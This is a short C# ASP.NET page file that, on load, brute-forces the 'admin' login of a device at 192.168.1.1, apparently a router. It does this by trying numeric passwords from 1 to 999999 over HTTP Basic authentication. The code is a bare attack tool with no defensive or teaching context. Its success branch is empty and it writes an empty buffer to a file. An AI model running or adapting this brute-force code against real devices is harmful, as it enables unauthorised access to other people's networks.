using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class 生成字典 : System.Web.UI.Page
{
    System.Text.StringBuilder sb = new System.Text.StringBuilder();
    protected void Page_Load(object sender, EventArgs e)
    {
        Enumerable.Range(1, 999999).ToList().ForEach((lo) =>
        {
            if (dd("admin", lo.ToString()) != -1)
            { 
                
            }
        });

        System.IO.File.WriteAllText(Server.MapPath("./a.txt"), sb.ToString());
    }
    public int dd(string u, string p)
    {
        System.Net.WebClient client = new System.Net.WebClient();
        string auth = Convert.ToBase64String(System.Text.UTF8Encoding.ASCII.GetBytes(string.Format("{0}:{1}", u, p)));
        client.Headers.Add("Authorization", "Basic " + auth);
        //  System.Collections.Specialized.NameValueCollection nvc = System.Collections.Specialized.NameValueCollection();
        //nvc.Add("status", content);
        //client.UploadValues("http://api.9911.com/statuses/update.xml", "Post", nvc);
        try
        {
            client.DownloadString("http://192.168.1.1");
        }
        catch {
            return -1;
        }
        return 0;
    }
    
       


}